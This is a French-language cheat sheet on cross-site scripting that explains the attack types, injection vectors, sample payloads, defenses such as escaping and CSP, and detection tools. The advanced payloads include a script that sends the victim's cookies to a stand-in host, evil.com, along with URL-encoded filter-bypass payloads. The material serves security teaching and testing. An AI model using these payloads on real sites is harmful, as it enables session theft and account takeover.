# XSS.md

## Cheat Sheet - XSS (Cross-Site Scripting)

Ce document présente les attaques XSS, leurs mécanismes, exemples et défenses, à utiliser dans des environnements contrôlés et légaux uniquement.


---

## 1. Comprendre XSS

XSS permet à un attaquant d’injecter du code malveillant (souvent JavaScript) dans une page web vue par d’autres utilisateurs, en exploitant un manque de validation des entrées.

| **Aspect**           | **Description**                                      |
|----------------------|-----------------------------------------------------|
| **Cible**            | Navigateur des utilisateurs                        |
| **Condition**        | Entrée non sanitizée ou mal échappée               |
| **Moyen**            | Injection de scripts (HTML, JS, etc.)              |
| **Impact**           | Vol de données, redirection, exécution de code     |

---

## 2. Types d'attaques XSS

### Reflected XSS
| Exemple                                  | Description                                      |
|------------------------------------------|--------------------------------------------------|
| `http://site.com?q=<script>alert(1)</script>` | Script renvoyé dans la réponse via un paramètre |

### Stored XSS
| Exemple                                  | Description                                      |
|------------------------------------------|--------------------------------------------------|
| `<script>alert('Hacked')</script>` (dans un commentaire) | Stocké sur le serveur et exécuté pour tous     |

### DOM-based XSS
| Exemple                                  | Description                                      |
|------------------------------------------|--------------------------------------------------|
| ```javascript                            | Manipulation directe du DOM                      |
| document.write(location.search.slice(1)) |                                                  |
| ```                                      | Exécuté côté client sans aller au serveur        |

---

## 3. Vecteurs d’injection courants

| **Vecteur**          | **Exemple**                                         |
|----------------------|----------------------------------------------------|
| **Balises HTML**     | `<script>alert(1)</script>`                       |
| **Attributs HTML**   | `<img src="x" onerror="alert(1)">`                |
| **JavaScript**       | `eval(prompt('Code ici'))`                        |
| **CSS**              | `<style>body{background:url(javascript:alert(1))}</style>` |

---

## 4. Exemples de payloads XSS

### Payloads simples
| Payload                          | Description                                      |
|----------------------------------|--------------------------------------------------|
| `<script>alert('XSS')</script>`  | Alerte basique                                   |
| `<img src=x onerror=alert(1)>`   | Exécuté si l’image ne charge pas                 |
| `<a href="javascript:alert(1)">Clique</a>` | Exécuté au clic                       |

### Payloads avancés
| Payload                                  | Description                                      |
|------------------------------------------|--------------------------------------------------|
| `<script>document.location='http://evil.com?cookie='+document.cookie</script>` | Vol de cookies |
| `"><script>alert(1)</script>`            | Sortie d’un attribut HTML                        |
| `%3Cscript%3Ealert(1)%3C/script%3E`      | Encodé URL pour contourner les filtres           |

---

## 5. Préventions contre XSS

### Mécanismes de base
| **Méthode**          | **Description**                                      |
|----------------------|-----------------------------------------------------|
| **Échappement**      | Encoder `<` en `&lt;`, `"` en `&quot;`            |
| **Sanitisation**     | Supprimer ou filtrer les balises dangereuses       |
| **CSP**              | Content Security Policy pour limiter les scripts   |

### Exemples d’implémentation
| **Technique**        | **Code/Exemple**                                    |
|----------------------|----------------------------------------------------|
| **Échappement PHP**  | `echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');` |
| **CSP dans header**  | `Content-Security-Policy: script-src 'self';`      |
| **Filtrage JS**      | Utiliser DOMPurify ou bibliothèques similaires     |

### Contournements possibles
| **Faille**           | **Explication**                                      |
|----------------------|-----------------------------------------------------|
| **Mauvais encodage** | Oubli d’échapper dans tous les contextes (HTML, JS) |
| **CSP faible**       | Autorise `unsafe-inline` ou sources non sécurisées  |
| **Injection DOM**    | Sanitisation serveur inefficace contre DOM XSS     |

---

## 6. Détection de vulnérabilités XSS

| **Test**             | **Méthode**                                         |
|----------------------|----------------------------------------------------|
| **Injection manuelle** | Tester `<script>alert(1)</script>` dans les champs |
| **Outils**           | Burp Suite, XSS Hunter, OWASP ZAP                  |
| **Symptôme**         | Exécution de code ou popup inattendue              |

---

## 7. Variantes avancées

### XSS + CSRF
- Injecter un script pour déclencher une attaque CSRF.

### Self-XSS
| Exemple                                  | Description                                      |
|------------------------------------------|--------------------------------------------------|
| `console.log('Test');` (via console dev) | Utilisateur piégé pour exécuter son propre code  |

---

## Précautions
- **Usage légal uniquement** : Tests dans des environnements autorisés.
- **Outils recommandés** : Burp Suite, XSSer pour automatisation.
- **Standards** : Suivre OWASP XSS Prevention Cheat Sheet.
